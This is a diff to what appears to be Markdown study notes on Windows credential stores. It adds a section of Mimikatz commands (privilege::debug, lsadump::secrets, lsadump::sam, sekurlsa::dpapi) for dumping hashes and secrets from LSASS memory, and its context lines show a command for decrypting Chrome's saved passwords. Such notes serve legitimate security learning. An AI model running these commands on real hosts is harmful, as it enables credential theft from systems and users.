@@ -25,7 +25,7 @@ LSA is **not a database**. It is the **security authority and orchestrator**.
                   │
      ┌────────────┼────────────┐
      │            │            │
-   SAM          DPAPI        SECURITY
+   SAM          SYSTEM      SECURITY
 (local hashes) (crypto)   (LSA secrets)
 
 ```
@@ -146,6 +146,48 @@ dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Lo
 ```
 
 This command locates Chrome’s encrypted credential database and uses DPAPI to decrypt stored usernames and passwords.
+
+---
+
+## Credential Extraction with Mimikatz 
+
+When administrative or SYSTEM-level access is obtained on a Windows host, credentials can be extracted **directly from memory** by targeting the Local Security Authority Subsystem Service (LSASS). 
+
+### Elevating Privileges in Mimikatz
+
+Before accessing sensitive material, privilege escalation must be enabled:
+
+```text
+mimikatz
+privilege::debug
+```
+
+### Dumping LSA Secrets (Live)
+
+LSA secrets can be extracted directly from memory instead of the registry:
+
+```text
+lsadump::secrets
+```
+
+
+### Dumping the SAM Database with Mimikatz
+
+Mimikatz can also extract SAM hashes directly without saving registry hives to disk:
+
+```text
+lsadump::sam
+```
+
+
+### DPAPI Credential Extraction
+
+DPAPI master keys can be extracted from memory and used to decrypt application secrets:
+
+```text
+sekurlsa::dpapi
+```
+
 
 ---
 
